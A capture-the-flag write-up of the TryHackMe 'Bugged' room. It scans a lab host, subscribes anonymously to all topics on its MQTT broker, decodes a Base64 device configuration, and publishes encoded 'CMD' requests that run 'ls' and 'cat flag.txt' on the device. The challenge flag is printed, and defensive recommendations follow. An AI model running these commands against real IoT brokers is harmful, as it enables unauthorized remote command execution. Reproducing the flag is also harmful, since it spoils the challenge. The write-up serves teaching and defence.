---
description: An evidence-based walkthrough of the TryHackMe Bugged MQTT challenge.
---

# Bugged Write-up

## Bugged Write-up

### Challenge information

* **Platform:** TryHackMe
* **Room:** Bugged
* **Room URL:** [https://tryhackme.com/room/bugged](https://tryhackme.com/room/bugged)
* **Target:** `10.113.140.34`
* **Scope:** Authorized TryHackMe lab environment

### Overview

Bugged is an MQTT-focused challenge. Reconnaissance exposed SSH and an MQTT broker. Anonymous MQTT subscription then revealed smart-device telemetry and a Base64-encoded configuration message.

Decoding that message exposed a device identifier, supported commands, and separate request and response topics. Publishing Base64-encoded command messages to the device's command topic produced command output on its response topic. Reading `flag.txt` returned the challenge flag.

### Table of contents

* [Tools used](bugged-write-up.md#tools-used)
* [Initial reconnaissance](bugged-write-up.md#initial-reconnaissance)
* [MQTT enumeration](bugged-write-up.md#mqtt-enumeration)
* [Configuration decoding](bugged-write-up.md#configuration-decoding)
* [Command-channel interaction](bugged-write-up.md#command-channel-interaction)
* [Custom MQTT client](bugged-write-up.md#custom-mqtt-client)
* [Flag retrieval](bugged-write-up.md#flag-retrieval)
* [Attack chain](bugged-write-up.md#attack-chain)
* [Vulnerability analysis](bugged-write-up.md#vulnerability-analysis)
* [Defensive recommendations](bugged-write-up.md#defensive-recommendations)
* [Evidence integrity and limitations](bugged-write-up.md#evidence-integrity-and-limitations)
* [Final summary](bugged-write-up.md#final-summary)

### Tools used

* RustScan
* Nmap
* Mosquitto clients
* Base64
* Python
* Paho MQTT

### Initial reconnaissance

RustScan identified two open TCP ports and launched an Nmap scan:

```bash
rustscan -a 10.113.140.34
```

Relevant output:

```
Open 10.113.140.34:22
Open 10.113.140.34:1883

PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 62
1883/tcp open  mqtt    syn-ack ttl 61
```

SSH on TCP/22 provides a possible remote-administration path. MQTT on TCP/1883 became the immediate focus because it is a publish-subscribe protocol often used for IoT telemetry and device control.

RustScan also warned that the local file limit was lower than its default batch size. That warning affects scan speed and resource use. It does not alter the observed open-port result.

### MQTT enumeration

MQTT clients publish messages to named topics. Subscribers receive messages from topics they are permitted to access. The `#` wildcard subscribes to every accessible topic below the broker's topic hierarchy.

The MQTT publish-subscribe model was reviewed using [Cedalo's Mosquitto publish and subscribe guide](https://www.cedalo.com/blog/mqtt-subscribe-publish-mosquitto-pub-sub-example).

The broker was monitored with:

```bash
mosquitto_sub -h 10.113.140.34 -t "#" -v
```

* `-h` selects the broker host.
* `-t "#"` subscribes to all accessible topics.
* `-v` prints each topic alongside its message.

Observed messages included smart-device telemetry:

```
livingroom/speaker {"id":11072581869255631885,"gain":75}
storage/thermostat {"id":5752657611924051632,"temperature":23.953163}
patio/lights {"id":17795809970683467573,"color":"GREEN","status":"ON"}
kitchen/toaster {"id":18111977337208864513,"in_use":false,"temperature":153.97867,"toast_time":355}
frontdeck/camera {"id":10734610730184262916,"yaxis":63.71649,"xaxis":136.0597,"zoom":0.06650866,"movement":false}
```

A separate configuration topic exposed an encoded payload:

```
yR3gPp0r8Y/AGlaMxmHJe/qV66JF5qmH/config eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ==
```

The ability to subscribe without credentials is observed for the accessible topics. It demonstrates insufficient authorization for this lab broker's exposed telemetry and configuration channel.

### Configuration decoding

The configuration value was Base64-decoded:

```bash
echo -n 'eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ==' | base64 -d
```

Decoded output:

```json
{
  "id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d",
  "registered_commands": ["HELP", "CMD", "SYS"],
  "pub_topic": "U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub",
  "sub_topic": "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"
}
```

Base64 is an encoding format, not encryption. Anyone who receives this payload can decode it without a secret key. The configuration revealed the device ID, a command interface, and two opaque MQTT topic names.

The topic labels describe the device's own publish and subscribe behavior. In the observed interaction, the client published requests to `sub_topic`, which the device consumed, and listened on `pub_topic` for device responses.

### Command-channel interaction

A command message was constructed as JSON, encoded in Base64, and published to the device command topic. The first request asked the device to list files:

```bash
mosquitto_pub -h 10.113.140.34 -t XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub -m 'eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAibHMifQ=='
```

The message decodes to the following request:

```json
{
  "id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d",
  "cmd": "CMD",
  "arg": "ls"
}
```

The response arrived on the decoded `pub_topic`:

```
U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiZmxhZy50eHRcbiJ9
```

Decoded response:

```json
{
  "id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d",
  "response": "flag.txt\n"
}
```

The `CMD` interface therefore executed `ls` and returned its output over MQTT. This is direct evidence of a remote command-execution channel exposed through the broker.

### Custom MQTT client

A custom interactive Python client was written to practice MQTT automation. It uses Paho MQTT and implements the same observed request-response protocol.

The client:

* Connects to the MQTT broker on TCP/1883.
* Subscribes to the configured response topic.
* Serializes `id`, `cmd`, and `arg` into JSON.
* Base64-encodes and publishes the request to the command topic.
* Decodes Base64 and JSON responses.
* Matches responses to the expected device ID.
* Waits for a response with a configurable timeout.

The supplied screenshot shows the custom client receiving the `flag.txt` directory-listing result and the flag response. It also shows the Base64 configuration decode in CyberChef.

### Flag retrieval

A second command request read the discovered file:

```bash
mosquitto_pub -h 10.113.140.34 -t XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub -m 'eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAiY2F0IGZsYWcudHh0In0='
```

The response message was Base64-decoded:

```bash
echo -n 'eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiZmxhZ3sxOGQ0NGZjMDcwN2FjOGRjOGJlNDViYjgzZGI1NDAxM31cbiJ9' | base64 -d
```

Observed output:

```json
{
  "id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d",
  "response": "flag{18d44fc0707ac8dc8be45bb83db54013}\n"
}
```

The observed flag is:

```
flag{18d44fc0707ac8dc8be45bb83db54013}
```

### Attack chain

```mermaid
flowchart TD
    A[RustScan finds SSH and MQTT] --> B[Subscribe to accessible MQTT topics]
    B --> C[Telemetry and Base64 config exposed]
    C --> D[Decode device ID and MQTT topics]
    D --> E[Publish CMD request to device topic]
    E --> F[Receive command output on response topic]
    F --> G[Read flag.txt]
    G --> H[Decode flag response]
```

### Vulnerability analysis

The challenge demonstrates a broken IoT command architecture:

1. The MQTT broker accepted unauthenticated access to sensitive topics.
2. A wildcard subscription exposed device telemetry and configuration data.
3. Base64 concealed, but did not protect, command topics and device metadata.
4. The exposed configuration described a `CMD` interface.
5. A publishable MQTT request caused command execution and returned the output.

The primary issue is not Base64 itself. The security failure is trusting unauthenticated broker clients with access to a device command channel.

### Defensive recommendations

* Require authenticated MQTT clients.
* Enforce per-client topic authorization with broker access-control lists.
* Separate telemetry, administration, and device-command topics.
* Do not expose command topics to broad or anonymous subscribers.
* Do not use Base64 as a confidentiality control.
* Avoid accepting arbitrary operating-system commands from MQTT messages.
* Use allowlisted device actions with strict schemas and validation.
* Encrypt MQTT traffic with TLS and monitor unexpected subscriptions or publishes.
* Rotate topic names and credentials after suspected exposure.

### Evidence integrity and limitations

* Commands and output are preserved from the supplied authorized lab session.
* RustScan and Nmap established only TCP/22 and TCP/1883 as open.
* The configuration and command payloads were decoded from observed Base64 data.
* The custom Python client is described from the supplied source and screenshot.
* No SSH access or additional host-level compromise was recorded.

### Final summary

Bugged exposed an MQTT broker that permitted access to device telemetry, configuration, and a remote command channel. A wildcard subscription revealed an encoded device configuration. Decoding it provided the device ID and the topics required to issue commands and receive results.

A Base64-encoded `CMD` request listed the target directory. A second request read `flag.txt`, returning `flag{18d44fc0707ac8dc8be45bb83db54013}`. The custom MQTT client then automated the same request-response workflow.
